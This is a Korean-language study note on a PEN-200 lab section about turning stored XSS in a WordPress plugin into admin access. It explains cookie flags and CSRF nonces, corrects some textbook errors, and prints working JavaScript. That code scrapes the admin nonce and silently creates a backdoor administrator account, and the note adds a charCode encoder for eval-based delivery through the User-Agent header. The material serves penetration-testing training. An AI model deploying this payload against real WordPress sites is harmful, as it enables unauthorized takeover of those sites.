# 8.4.5 XSS 기반 권한 상승

> **Privilege Escalation via XSS** · PEN-200 §8.4.5

JavaScript 를 대상 WordPress 에 저장해 두고 admin 이 페이지를 열 때 실행시킬 수 있게 됐으므로, 이제 그 실행을 관리자 권한 획득으로 바꿀 경로를 찾음.

**1차 후보 — 쿠키·세션 탈취.** 세션 관리 설정이 허술하면 XSS 로 인증된 사용자의 쿠키를 훔쳐 그 사용자로 위장할 수 있음. 웹사이트는 쿠키로 사용자 상태와 정보를 추적하고, 쿠키에는 여러 선택적 플래그가 붙을 수 있는데 침투 테스터에게 중요한 것은 둘임:

| 플래그 | 효과 |
|---|---|
| `Secure` | 암호화된 연결(HTTPS)로만 쿠키를 보내게 함 — 평문으로 네트워크에 노출되어 캡처되는 것을 막음 |
| `HttpOnly` | JavaScript 의 쿠키 접근을 차단함 — **이 플래그가 없으면** XSS 페이로드로 쿠키를 훔칠 수 있음 |

실제로 확인함. admin 으로 로그인한 뒤 개발자 도구의 Storage 탭에서 왼쪽 Cookies 메뉴의 `http://offsecwp` 를 클릭함.

![[PEN200-Fig-118.png]]

*WordPress 쿠키 검사 — 세션 쿠키 전부에 HttpOnly 가 걸려 있음*

브라우저에 저장된 쿠키는 여섯 개지만 세션 쿠키는 넷이고, 그중 무시해도 되는 `wordpress_test_cookie` 를 빼면 **전부 HttpOnly 를 지원함**. 즉 세션 쿠키는 HTTP 요청에만 실려 나가고 **JavaScript 로는 읽을 수 없어** 이 공격 벡터로는 가져올 수 없음 → 다른 각도가 필요함.

**2차 후보 — 관리자 계정을 «관리자 대신» 생성시키기.** admin 이 주입된 JavaScript 가 든 Visitors 플러그인 대시보드를 열면 우리가 넣어둔 것이 무엇이든 실행됨 — 팝업 배너일 수도, 더 복잡한 함수일 수도 있음. 그래서 **WordPress 관리 계정을 하나 더 만드는 JS 함수**를 심으면 진짜 관리자가 우리 코드를 실행하는 순간 그 함수가 배후에서 돌아감. (Shift8 이 제시한 시나리오와 유사한 구성)

먼저 WordPress admin **nonce** 를 가져오는 함수가 필요함. nonce 는 서버가 생성해 각 HTTP 요청에 포함시키는 토큰으로, 무작위성을 더해 **CSRF(Cross-Site-Request-Forgery)** 를 막는 장치임. CSRF 는 피해자가 악성 링크를 클릭하면 그 사용자를 대신해 미리 설정된 동작이 수행되는 소셜 엔지니어링 공격이고, 링크는 무해해 보이는 설명으로 위장됨:

```
<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000"">Check out
these awesome cat memes!</a>
```

*CSRF 예시 — 링크는 가상의 은행 API 로 공격자 계정에 송금을 지시함*

> ⚠️ **교재 오류** — `amount=100000""` 에 큰따옴표가 하나 더 붙어 있음. `...amount=100000"` 이 맞음.

이 링크가 이메일 HTML 에 박혀 있으면 사용자에게는 설명 문구만 보이고 실제 HTTP 자원은 보이지 않음. 피해자가 같은 사이트에 유효한 세션으로 이미 로그인해 있어야 성립함. WordPress 는 공격자가 미리 알 수 없는 의사난수 nonce 를 검사해 이 공격을 막음.

**그러나 nonce 는 저장형 XSS 앞에서는 장애물이 아님** — 주입된 코드가 피해자 브라우저 안에서 실행되므로, nonce 가 들어 있는 페이지를 스스로 요청해 값을 읽어오면 됨:

```
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

*nonce 수집 — `/wp-admin/user-new.php` 를 요청해 응답에서 정규식으로 토큰을 추출*

정규식은 문자열 `ser" value="` 와 뒤따르는 큰따옴표 사이의 값을 잡음 — 응답 HTML 의 `..._wpnonce_create-user" value="<토큰>"` 부분에 걸림.

> ⚠️ **교재 오류** — 교재는 매칭 대상을 `/ser" value="` 로, 잡히는 값을 「영숫자(alphanumeric)」로 서술함. 앞의 `/` 는 정규식 리터럴 `/.../g` 의 **구분자**라 매칭 문자열에 포함되지 않고, 캡처는 `([^"]*?)` 이므로 **큰따옴표만 아니면 어떤 문자든** 잡힘.

nonce 를 동적으로 확보했으니 이제 계정 생성 본체를 만듦:

```
var params = "action=createuser&_wpnonce_create-
user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=
attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

*새 WordPress 관리자 계정 생성 — 앞서 얻은 `nonce` 뒤에 백도어 계정 파라미터가 붙음*

여기서 심는 것이 백도어 관리 계정임 — `user_login=attacker`, `role=administrator`. 이것이 통하면 WordPress 설치 전체에 대한 관리 접근이 생김.

**페이로드 가공 — minify 후 encode.** 페이로드가 Burp 와 대상 애플리케이션에서 올바로 처리되게 하려면 **먼저 한 줄로 압축(minify)하고, 다음 인코딩**해야 함. 압축은 JS Compress 사이트의 Compress JavaScript 로 하고 출력을 로컬에 저장함. 인코딩은 나쁜 문자가 페이로드 전송을 방해하지 않게 하려는 것이고 다음 함수를 씀:

```
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

*JS 문자열을 문자 코드 목록으로 인코딩하는 함수*

`encode_to_javascript` 는 압축된 JS 문자열을 받아 `charCodeAt` 으로 각 문자를 대응하는 UTF-16 정수 코드로 바꿈. 이 함수는 브라우저 콘솔에서 실행함.

실행 측에서는 반대로 `String.fromCharCode` 로 문자열을 복원한 뒤 `eval()` 로 실행함. 인코딩 결과를 복사해 다음 curl 명령에 넣고 공격을 발사함:

*최종 XSS 공격 발사 — User-Agent 헤더에 인코딩된 페이로드를 담아 Burp 를 경유시킴*

curl 을 실행하기 전에 Burp 를 켜고 **Intercept 는 켠 채로** 둠 — 페이로드가 든 요청을 Burp 로 흘려보내 직접 확인하기 위함임. 확인이 끝나면 Forward 로 요청을 보내고 Intercept 를 끔. 이 시점에 익스플로잇이 WordPress 데이터베이스에 저장돼 있어야 함.

실행을 시뮬레이션하려면 OffSec WP 인스턴스에 admin 으로 로그인해 좌측 하단의 Visitors 플러그인 대시보드를 클릭함.

⚠️ **함정** — 통계 화면에는 항목이 하나뿐이고 User-Agent 가 기록되지 않은 것처럼 «비어» 보임. 이는 실패가 아니라 User-Agent 값이 `<script>` 태그 안에 들어 있어 브라우저가 렌더할 문자열이 없기 때문임. 즉 이 시점에 악성 스크립트는 이미 실행된 뒤임.
